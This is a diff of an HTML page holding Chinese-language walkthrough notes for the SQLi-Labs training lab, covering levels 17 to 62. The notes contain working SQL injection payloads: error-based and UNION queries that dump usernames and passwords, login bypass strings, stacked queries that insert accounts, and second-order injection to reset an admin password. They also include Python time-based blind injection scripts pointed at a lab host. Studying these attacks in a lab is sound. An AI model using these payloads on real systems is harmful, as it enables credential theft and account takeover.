+<p>接下来，当想要注出user表中的数据时，会报错：<code>You can&#39;t specify target table &#39;users&#39; for update in FROM clause</code>，因为在同一语句中，不能先select出同一表中的某些值，再update这个表。</p>
+<p>所以要通过子查询，使select的表更换一个名称。<br>payload:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">User Name: admin</span><br><span class="line">New Password : 1' and extractvalue(1,concat(0x7e,( <span class="keyword">select</span> * <span class="keyword">from</span> ( <span class="keyword">select</span> <span class="keyword">group_concat</span>(username,<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">users</span> )a),<span class="number">0x7e</span>))<span class="comment">#</span></span><br><span class="line">回显：XPATH syntax <span class="keyword">error</span>: <span class="string">'~id,username,password~'</span></span><br><span class="line"></span><br><span class="line">发现报错的信息字数有限，因此想要获得全部数据的化可以通过<span class="keyword">limit</span>语句一条条的读:</span><br><span class="line"><span class="number">1</span><span class="string">' and extractvalue(1,concat(0x7e,( select * from ( select concat_ws('</span>:<span class="string">',username,password) from users limit 0,1)a),0x7e))#</span></span><br></pre></td></tr></table></figure></p>
+<p><br></p>
 <h4 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h4><p>进入页面发现会显示<code>Your IP ADDRESS is: xxx.xxx.xxx.xxx</code>，再根据名字判断应该是HTTP首部注入，注入的字段可能是X-Forward-For之类的地方，但登陆后会回显User-Agent的内容，这里是通过User-Agent进行注入。</p>
 <p>同样是报错注入：<br>先尝试：<br><img src="/2019/07/26/SQLi-Labs通关笔记/20190721000838862.png" alt="在这里插入图片描述"><br>由报错信息可以推测后台Insert语句<code>····VALUES (&#39;$uagent&#39;, &#39;$IP&#39;, $uname)</code></p>
 <p>因此构造payload：<br><code>1&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e)),&#39;&#39;,&#39;&#39;)#</code><br><img src="/2019/07/26/SQLi-Labs通关笔记/20190720235005723.png" alt="在这里插入图片描述"><br>最终payload:(通过改变limit语句逐条注出数据)<br><code>1&#39; and extractvalue(1,concat(0x7e,( select * from ( select concat_ws(&#39;:&#39;,username,password) from users limit 0,1)a),0x7e)),&#39;&#39;,&#39;&#39;)#</code><br><img src="/2019/07/26/SQLi-Labs通关笔记/20190720235138536.png" alt="在这里插入图片描述"></p>
@@ -449,84 +303,16 @@ New Password : 1&#39; and extractvalue(1,concat(0x7e,( select * from ( select gr
 <p><br></p>
 <h4 id="Less-24"><a href="#Less-24" class="headerlink" title="Less-24"></a>Less-24</h4><p>根据名字，是一道二次注入的题目，二次注入的题一般都要通过代码审计找出可控点，否则很难注入。</p>
 <p>那就进行代码审计，整个代码逻辑比较简单：注册 =&gt; 登陆（登陆时login.php会设置Session）=&gt; 登陆后可以修改密码</p>
-<p>重点关注一下操作数据库的部分，发现只有一个地方的变量在拼接到sql语句中时没有用<code>mysql_real_escape_string()</code>函数进行过滤，在pass_change.php中。</p>
-<pre><code class="php">if (isset($_POST[&#39;submit&#39;]))
-{
-    # Validating the user input........
-    $username= $_SESSION[&quot;username&quot;];
-    $curr_pass= mysql_real_escape_string($_POST[&#39;current_password&#39;]);
-    $pass= mysql_real_escape_string($_POST[&#39;password&#39;]);
-    $re_pass= mysql_real_escape_string($_POST[&#39;re_password&#39;]);
-
-    if($pass==$re_pass)
-    {    
-        $sql = &quot;UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;$username&#39; and password=&#39;$curr_pass&#39; &quot;;
-        $res = mysql_query($sql) or die(&#39;You tried to be smart, Try harder!!!! :( &#39;);
-        $row = mysql_affected_rows();
-        echo &#39;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&#39;;
-        echo &#39;&lt;center&gt;&#39;;
-        if($row==1)
-        {
-            echo &quot;Password successfully updated&quot;;
-
-        }
-        else
-        {
-            header(&#39;Location: failed.php&#39;);
-            //echo &#39;You tried to be smart, Try harder!!!! :( &#39;;
-        }
-    }
-    else
-    {
-        echo &#39;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&lt;center&gt;&#39;;
-        echo &quot;Make sure New Password and Retype Password fields have same value&quot;;
-        header(&#39;refresh:2, url=index.php&#39;);
-    }
-}
-</code></pre>
+<p>重点关注一下操作数据库的部分，发现只有一个地方的变量在拼接到sql语句中时没有用<code>mysql_real_escape_string()</code>函数进行过滤，在pass_change.php中。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment"># Validating the user input........</span></span><br><span class="line">	$username= $_SESSION[<span class="string">"username"</span>];</span><br><span class="line">	$curr_pass= mysql_real_escape_string($_POST[<span class="string">'current_password'</span>]);</span><br><span class="line">	$pass= mysql_real_escape_string($_POST[<span class="string">'password'</span>]);</span><br><span class="line">	$re_pass= mysql_real_escape_string($_POST[<span class="string">'re_password'</span>]);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>($pass==$re_pass)</span><br><span class="line">	&#123;	</span><br><span class="line">		$sql = <span class="string">"UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' "</span>;</span><br><span class="line">		$res = mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'You tried to be smart, Try harder!!!! :( '</span>);</span><br><span class="line">		$row = mysql_affected_rows();</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'&lt;font size="3" color="#FFFF00"&gt;'</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'&lt;center&gt;'</span>;</span><br><span class="line">		<span class="keyword">if</span>($row==<span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"Password successfully updated"</span>;</span><br><span class="line">	</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			header(<span class="string">'Location: failed.php'</span>);</span><br><span class="line">			<span class="comment">//echo 'You tried to be smart, Try harder!!!! :( ';</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'&lt;font size="5" color="#FFFF00"&gt;&lt;center&gt;'</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"Make sure New Password and Retype Password fields have same value"</span>;</span><br><span class="line">		header(<span class="string">'refresh:2, url=index.php'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 <p>即上述代码中的<code>$username</code>在用Update语句进行修改密码时，直接从Session中获取了，没有进行任何过滤。</p>
-<p>那么我们再来看看整个<code>$_SESSION[&quot;username&quot;]</code>是如何定义的，在login.php中：</p>
-<pre><code class="php">function sqllogin(){
-
-   $username = mysql_real_escape_string($_POST[&quot;login_user&quot;]);
-   $password = mysql_real_escape_string($_POST[&quot;login_password&quot;]);
-   $sql = &quot;SELECT * FROM users WHERE username=&#39;$username&#39; and password=&#39;$password&#39;&quot;;
-//$sql = &quot;SELECT COUNT(*) FROM users WHERE username=&#39;$username&#39; and password=&#39;$password&#39;&quot;;
-   $res = mysql_query($sql) or die(&#39;You tried to be real smart, Try harder!!!! :( &#39;);
-   $row = mysql_fetch_row($res);
-    //print_r($row) ;
-   if ($row[1]) {
-            return $row[1];
-   } else {
-              return 0;
-   }
-
-}
-
-$login = sqllogin();
-if (!$login== 0) 
-{
-    $_SESSION[&quot;username&quot;] = $login;
-    setcookie(&quot;Auth&quot;, 1, time()+3600);  /* expire in 15 Minutes */
-    header(&#39;Location: logged-in.php&#39;);
-} 
-......
-</code></pre>
+<p>那么我们再来看看整个<code>$_SESSION[&quot;username&quot;]</code>是如何定义的，在login.php中：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqllogin</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">   $username = mysql_real_escape_string($_POST[<span class="string">"login_user"</span>]);</span><br><span class="line">   $password = mysql_real_escape_string($_POST[<span class="string">"login_password"</span>]);</span><br><span class="line">   $sql = <span class="string">"SELECT * FROM users WHERE username='$username' and password='$password'"</span>;</span><br><span class="line"><span class="comment">//$sql = "SELECT COUNT(*) FROM users WHERE username='$username' and password='$password'";</span></span><br><span class="line">   $res = mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'You tried to be real smart, Try harder!!!! :( '</span>);</span><br><span class="line">   $row = mysql_fetch_row($res);</span><br><span class="line">	<span class="comment">//print_r($row) ;</span></span><br><span class="line">   <span class="keyword">if</span> ($row[<span class="number">1</span>]) &#123;</span><br><span class="line">			<span class="keyword">return</span> $row[<span class="number">1</span>];</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$login = sqllogin();</span><br><span class="line"><span class="keyword">if</span> (!$login== <span class="number">0</span>) </span><br><span class="line">&#123;</span><br><span class="line">	$_SESSION[<span class="string">"username"</span>] = $login;</span><br><span class="line">	setcookie(<span class="string">"Auth"</span>, <span class="number">1</span>, time()+<span class="number">3600</span>);  <span class="comment">/* expire in 15 Minutes */</span></span><br><span class="line">	header(<span class="string">'Location: logged-in.php'</span>);</span><br><span class="line">&#125; </span><br><span class="line">......</span><br></pre></td></tr></table></figure></p>
 <p>可以看到<code>$_SESSION[&quot;username&quot;]</code>是在登陆成功时直接从数据库中取出用户名，没有进行过滤，而这个用户名我们在注册新用户的时候是可控的，这样就找到了可控变量，注入思路也就清楚了0。<br>也就是说虽然在注册的时候构造的payload被过滤了没有办法注入，但是依旧会存到数据库里，当你直接取出并拼接到另一个sql语句时就造成了二次注入。</p>
 <p>注入过程：</p>
 <p>注册一个用户名为<code>admin&#39;#</code>的用户，并登陆。</p>
 <p>这样在修改密码时，拼接过后的Update语句就为：<br><code>UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39; admin&#39;# &#39; and password=&#39;$curr_pass&#39;</code></p>
 <p>也就可以修改admin用户的密码了。</p>
 <p><br></p>
-<h4 id="Less-25"><a href="#Less-25" class="headerlink" title="Less-25"></a>Less-25</h4><p>单引号闭合，过滤了<code>or</code>、<code>and</code>、<code>&amp;&amp;</code>：</p>
-<pre><code class="php">function blacklist($id)
-{
-    $id= preg_replace(&#39;/or/i&#39;,&quot;&quot;, $id);            //strip out OR (non case sensitive)
-    $id= preg_replace(&#39;/AND/i&#39;,&quot;&quot;, $id);        //Strip out AND (non case sensitive)
-
-    return $id;
-}
-</code></pre>
+<h4 id="Less-25"><a href="#Less-25" class="headerlink" title="Less-25"></a>Less-25</h4><p>单引号闭合，过滤了<code>or</code>、<code>and</code>、<code>&amp;&amp;</code>：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span><span class="params">($id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	$id= preg_replace(<span class="string">'/or/i'</span>,<span class="string">""</span>, $id);			<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/AND/i'</span>,<span class="string">""</span>, $id);		<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 <p>可以采用双写绕过。</p>
 <p>payload:（注意<code>information</code>和<code>password</code>里也有<code>or</code>，需要双写）</p>
 <p><code>?id=-1&#39; union select 1,(select group_concat(column_name) from infoorrmation_schema.columns where table_name=&#39;users&#39;),3--+</code></p>
@@ -575,22 +361,16 @@ if (!$login== 0)
 <h4 id="Less-33"><a href="#Less-33" class="headerlink" title="Less-33"></a>Less-33</h4><p>与less-32一样…</p>
 <p>payload:<br><code>?id=-1%df&#39; union select 1,(select group_concat(username) from users),(select group_concat(password) from users)--+</code><br><br></p>
 <h4 id="Less-34"><a href="#Less-34" class="headerlink" title="Less-34"></a>Less-34</h4><p>这关的过滤方式和前面一样，考虑宽字节注入，但是POST传入数据时不会进行URL编码，因此这里采用将utf8单引号转为utf-16/utf-32编码绕过，即将<code>&#39;</code>转为utf-16为 <code>�&#39;</code></p>
-<p>payload:</p>
-<pre><code>万能密码：
-Username: 1�&#39; or 1=1#
-Password: 任意
-</code></pre><p><br></p>
+<p>payload:<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">万能密码：</span><br><span class="line">Username: <span class="number">1</span>�' <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">#</span></span><br><span class="line">Password: 任意</span><br></pre></td></tr></table></figure></p>
+<p><br></p>
 <h4 id="Less-35"><a href="#Less-35" class="headerlink" title="Less-35"></a>Less-35</h4><p>GET型宽字解注入，但区别是这里是数字型，不需要用单引号闭合了，其他的和less-32一样，16进制绕过一下表名即可。</p>
 <p>payload:<br><code>?id=-1 union select 1,(select group_concat(username) from users),(select group_concat(password) from users)--+</code><br><br></p>
 <h4 id="Less-36"><a href="#Less-36" class="headerlink" title="Less-36"></a>Less-36</h4><p>好像和less-32一样..</p>
 <p>payload:<br><code>?id=-1%df&#39; union select 1,(select group_concat(username) from users),(select group_concat(password) from users)--+</code></p>
 <p><br></p>
 <h4 id="Less-37"><a href="#Less-37" class="headerlink" title="Less-37"></a>Less-37</h4><p>好像和less-34一样…</p>
-<p>payload:</p>
-<pre><code>万能密码：
-Username: 1�&#39; or 1=1#
-Password: 任意
-</code></pre><p><br></p>
+<p>payload:<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">万能密码：</span><br><span class="line">Username: <span class="number">1</span>�' <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">#</span></span><br><span class="line">Password: 任意</span><br></pre></td></tr></table></figure></p>
+<p><br></p>
 <h4 id="Less-38"><a href="#Less-38" class="headerlink" title="Less-38"></a>Less-38</h4><p>堆叠注入，可以执行多条语句，用分号间隔，可参考：<a href="https://www.cnblogs.com/lcamry/p/5762905.html" target="_blank" rel="noopener">https://www.cnblogs.com/lcamry/p/5762905.html</a></p>
 <p>堆叠注入优点是可以执行的语句更加灵活，如Create、Delete、Update、Insert、Drop….，但代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。</p>
 <p>如执行如下payload：<br><code>?id=1&#39;;create table Lethe like users--+</code><br>执行完后页面没有变，但是查询表时可以发现多出了<code>lethe</code>表：<br><img src="/2019/07/26/SQLi-Labs通关笔记/20190724211633834.png" alt="在这里插入图片描述"></p>
@@ -604,26 +384,18 @@ Password: 任意
 <p><code>?id=1;insert into users(id,username,password) values(&#39;20&#39;,&#39;Lethe&#39;,&#39;Lethe&#39;)--+</code><br><br></p>
 <h4 id="Less-42"><a href="#Less-42" class="headerlink" title="Less-42"></a>Less-42</h4><p>进入页面是一个登陆窗口，发现注册不了，提示要我们<code>hack</code>掉它，根据前面，判断应该是用堆叠注入插入一个用户到数据库中，来进行登陆。</p>
 <p>但这里对Usernmae进行了过滤，因此利用Password来进行堆叠注入。</p>
-<p>payload:</p>
-<pre><code>Username：任意
-Password：1&#39;;insert into users(id,username,password) values(&#39;20&#39;,&#39;Lethe&#39;,&#39;Lethe&#39;)#
-</code></pre><p>先利用payload尝试登陆，虽然显示登陆失败，但实际上堆叠注入的语句已经执行，然后再用账户密码均为<code>Lethe</code>的账户进行登陆，发现可以登陆成功。<br><img src="/2019/07/26/SQLi-Labs通关笔记/20190724215904736.png" alt="在这里插入图片描述"></p>
+<p>payload:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Username：任意</span><br><span class="line">Password：1';<span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">users</span>(<span class="keyword">id</span>,username,<span class="keyword">password</span>) <span class="keyword">values</span>(<span class="string">'20'</span>,<span class="string">'Lethe'</span>,<span class="string">'Lethe'</span>)<span class="comment">#</span></span><br></pre></td></tr></table></figure></p>
+<p>先利用payload尝试登陆，虽然显示登陆失败，但实际上堆叠注入的语句已经执行，然后再用账户密码均为<code>Lethe</code>的账户进行登陆，发现可以登陆成功。<br><img src="/2019/07/26/SQLi-Labs通关笔记/20190724215904736.png" alt="在这里插入图片描述"></p>
 <p>如果还希望越权的话，原理参考<strong>less-24</strong>，构造<code>1&#39;;insert into users(id,username,password) values(&quot;25&quot;,&quot;admin&#39;#&quot;,&quot;123&quot;)#</code>，这样就插入可用户名为<code>admin&#39;#</code>，密码为<code>123</code>的用户，登陆此账号：<br><img src="/2019/07/26/SQLi-Labs通关笔记/20190724220536354.png" alt="在这里插入图片描述"><br>然后用此账号进行修改密码，实际上修改了用户<code>admin</code>的密码。<br><br></p>
 <h4 id="Less-43"><a href="#Less-43" class="headerlink" title="Less-43"></a>Less-43</h4><p>与less-42一样，区别是这里用<code>(&#39;$password&#39;)</code>闭合。</p>
-<p>payload：</p>
-<pre><code>Username：任意
-Password：1&#39;);insert into users(id,username,password) values(&#39;20&#39;,&#39;Lethe&#39;,&#39;Lethe&#39;)#
-</code></pre><p><br></p>
+<p>payload：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Username：任意</span><br><span class="line">Password：1');<span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">users</span>(<span class="keyword">id</span>,username,<span class="keyword">password</span>) <span class="keyword">values</span>(<span class="string">'20'</span>,<span class="string">'Lethe'</span>,<span class="string">'Lethe'</span>)<span class="comment">#</span></span><br></pre></td></tr></table></figure></p>
+<p><br></p>
 <h4 id="Less-44"><a href="#Less-44" class="headerlink" title="Less-44"></a>Less-44</h4><p>好像和less-42一样…</p>
-<p>payload:</p>
-<pre><code>Username：任意
-Password：1&#39;;insert into users(id,username,password) values(&#39;20&#39;,&#39;Lethe&#39;,&#39;Lethe&#39;)#
-</code></pre><p><br></p>
+<p>payload:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Username：任意</span><br><span class="line">Password：1';<span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">users</span>(<span class="keyword">id</span>,username,<span class="keyword">password</span>) <span class="keyword">values</span>(<span class="string">'20'</span>,<span class="string">'Lethe'</span>,<span class="string">'Lethe'</span>)<span class="comment">#</span></span><br></pre></td></tr></table></figure></p>
+<p><br></p>
 <h4 id="Less-45"><a href="#Less-45" class="headerlink" title="Less-45"></a>Less-45</h4><p>好像和less-43一样…</p>
-<p>payload:</p>
-<pre><code>Username：任意
-Password：1&#39;);insert into users(id,username,password) values(&#39;20&#39;,&#39;Lethe&#39;,&#39;Lethe&#39;)#
-</code></pre><p><br></p>
+<p>payload:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Username：任意</span><br><span class="line">Password：1');<span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">users</span>(<span class="keyword">id</span>,username,<span class="keyword">password</span>) <span class="keyword">values</span>(<span class="string">'20'</span>,<span class="string">'Lethe'</span>,<span class="string">'Lethe'</span>)<span class="comment">#</span></span><br></pre></td></tr></table></figure></p>
+<p><br></p>
 <h4 id="Less-46"><a href="#Less-46" class="headerlink" title="Less-46"></a>Less-46</h4><p>order by注入，<code>?id=1 desc</code>和<code>?id=1 asc</code>返回的数据有区别说明可以进行注入。</p>
 <ul>
 <li>这一关会回显错误，因此可以采用报错注入。</li>
@@ -637,55 +409,9 @@ Password：1&#39;);insert into users(id,username,password) values(&#39;20&#39;,&
 <h4 id="Less-47"><a href="#Less-47" class="headerlink" title="Less-47"></a>Less-47</h4><p>单引号闭合sort，其他的与上一关一样。</p>
 <p>payload：<br><code>?sort=1&#39; and extractvalue(1,concat(0x7e,( select concat_ws(&#39;:&#39;,username,password) from users limit 0,1),0x7e))--+</code><br><br></p>
 <h4 id="Less-48"><a href="#Less-48" class="headerlink" title="Less-48"></a>Less-48</h4><p>这一关原理同less-46，但是不会回显报错信息，所以不能使用报错注入。</p>
-<p>采用时间盲注，脚本如下：</p>
-<pre><code class="python"># less-48
-# auther：Lethe
-
-import requests
-
-url = &#39;http://43.247.91.228:84/Less-48/&#39;
-
-payloads = &#39;QqWwEeRrTtYyUuIiOoPpAaSsDdFfGgHhJjKkLlZzXxCcVvBbNnMm{},_&#39;
-
-data = &#39;&#39;
-
-for i in range(50):
-    for j in payloads:
-        # payload = f&quot;?sort=1 and if((substr(binary database(),{i},1)=&#39;{j}&#39;),sleep(3),1)&quot;
-        # payload = f&quot;?sort=1 and if((substr((select binary group_concat(table_name) from information_schema.tables where table_schema=database()) ,{i},1)=&#39;{j}&#39;),sleep(3),1)&quot;
-        payload = f&quot;?sort=1 and if((substr((select binary group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;) ,{i},1)=&#39;{j}&#39;),sleep(3),1)&quot;       
-        try:
-            r = requests.get(url+payload, timeout=1)
-        except Exception:
-            data += j
-            print(data)
-            break
-</code></pre>
+<p>采用时间盲注，脚本如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># less-48</span></span><br><span class="line"><span class="comment"># auther：Lethe</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://43.247.91.228:84/Less-48/'</span></span><br><span class="line"></span><br><span class="line">payloads = <span class="string">'QqWwEeRrTtYyUuIiOoPpAaSsDdFfGgHhJjKkLlZzXxCcVvBbNnMm&#123;&#125;,_'</span></span><br><span class="line"></span><br><span class="line">data = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> payloads:</span><br><span class="line">        <span class="comment"># payload = f"?sort=1 and if((substr(binary database(),&#123;i&#125;,1)='&#123;j&#125;'),sleep(3),1)"</span></span><br><span class="line">        <span class="comment"># payload = f"?sort=1 and if((substr((select binary group_concat(table_name) from information_schema.tables where table_schema=database()) ,&#123;i&#125;,1)='&#123;j&#125;'),sleep(3),1)"</span></span><br><span class="line">        payload = <span class="string">f"?sort=1 and if((substr((select binary group_concat(column_name) from information_schema.columns where table_name='users') ,<span class="subst">&#123;i&#125;</span>,1)='<span class="subst">&#123;j&#125;</span>'),sleep(3),1)"</span>       </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(url+payload, timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            data += j</span><br><span class="line">            print(data)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p>
 <p><br></p>
-<h4 id="Less-49"><a href="#Less-49" class="headerlink" title="Less-49"></a>Less-49</h4><p>同less-47单引号闭合，但是不能回显报错信息，所以还是采用时间盲注，脚本如下：</p>
-<pre><code class="python"># less-49
-# auther：Lethe
-
-import requests
-
-url = &#39;http://43.247.91.228:84/Less-49/&#39;
-
-payloads = &#39;QqWwEeRrTtYyUuIiOoPpAaSsDdFfGgHhJjKkLlZzXxCcVvBbNnMm{},_&#39;
-
-data = &#39;&#39;
-
-for i in range(50):
-    for j in payloads:
-        # payload = f&quot;?sort=1&#39; and if((substr(binary database(),{i},1)=&#39;{j}&#39;),sleep(3),1)--+&quot;
-        # payload = f&quot;?sort=1&#39; and if((substr((select binary group_concat(table_name) from information_schema.tables where table_schema=database()) ,{i},1)=&#39;{j}&#39;),sleep(3),1)--+&quot;
-        payload = f&quot;?sort=1&#39; and if((substr((select binary group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;) ,{i},1)=&#39;{j}&#39;),sleep(3),1)--+&quot;       
-        try:
-            r = requests.get(url+payload, timeout=1)
-        except Exception:
-            data += j
-            print(data)
-            break
-</code></pre>
+<h4 id="Less-49"><a href="#Less-49" class="headerlink" title="Less-49"></a>Less-49</h4><p>同less-47单引号闭合，但是不能回显报错信息，所以还是采用时间盲注，脚本如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># less-49</span></span><br><span class="line"><span class="comment"># auther：Lethe</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://43.247.91.228:84/Less-49/'</span></span><br><span class="line"></span><br><span class="line">payloads = <span class="string">'QqWwEeRrTtYyUuIiOoPpAaSsDdFfGgHhJjKkLlZzXxCcVvBbNnMm&#123;&#125;,_'</span></span><br><span class="line"></span><br><span class="line">data = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> payloads:</span><br><span class="line">        <span class="comment"># payload = f"?sort=1' and if((substr(binary database(),&#123;i&#125;,1)='&#123;j&#125;'),sleep(3),1)--+"</span></span><br><span class="line">        <span class="comment"># payload = f"?sort=1' and if((substr((select binary group_concat(table_name) from information_schema.tables where table_schema=database()) ,&#123;i&#125;,1)='&#123;j&#125;'),sleep(3),1)--+"</span></span><br><span class="line">        payload = <span class="string">f"?sort=1' and if((substr((select binary group_concat(column_name) from information_schema.columns where table_name='users') ,<span class="subst">&#123;i&#125;</span>,1)='<span class="subst">&#123;j&#125;</span>'),sleep(3),1)--+"</span>       </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(url+payload, timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            data += j</span><br><span class="line">            print(data)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p>
 <p><br></p>
 <h4 id="Less-50"><a href="#Less-50" class="headerlink" title="Less-50"></a>Less-50</h4><p>这一关是order by与堆叠注入结合，数字型，无闭合。</p>
 <p>payload:<br><code>?sort=1;insert into users(id,username,password) values(&#39;20&#39;,&#39;lethe&#39;,&#39;lethe&#39;)--+</code></p>
@@ -760,94 +486,10 @@ for i in range(50):
 </ul>
 <p>除此之外，我前面的脚本都是采取顺序爆破的，这样更方便一点，但这里可以采用二分法来进行盲注，可以减少请求的次数。</p>
 <p>脚本如下：</p>
-<p>（1）表名：（已测试出表名长度为10）</p>
-<pre><code class="python">import requests
-
-url = &#39;http://43.247.91.228:84/Less-62/&#39;
-
-data = &#39;&#39;
-
